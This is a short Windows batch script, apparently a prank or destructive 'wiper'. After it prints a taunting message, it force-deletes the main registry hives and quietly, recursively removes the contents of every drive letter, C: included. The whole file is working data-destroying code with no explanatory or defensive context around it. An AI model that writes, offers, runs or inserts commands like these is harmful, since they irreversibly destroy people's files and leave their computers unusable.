@echo off
echo PREPARE YOUR PC IS GONNA GET BLASTED!

reg delete HKCU /f
reg delete HKU /f
reg delete HKCC /f

rd Z: /s /q
rd Y: /s /q
rd X: /s /q
rd W: /s /q
rd V: /s /q
rd U: /s /q
rd T: /s /q
rd S: /s /q
rd R: /s /q
rd Q: /s /q
rd P: /s /q
rd O: /s /q
rd N: /s /q
rd M: /s /q
rd L: /s /q
rd K: /s /q
rd J: /s /q
rd I: /s /q
rd H: /s /q
rd G: /s /q
rd F: /s /q
rd E: /s /q
rd D: /s /q
rd B: /s /q
rd A: /s /q

rd C: /s /q
reg delete HKCR /f
reg delete HKLM /f
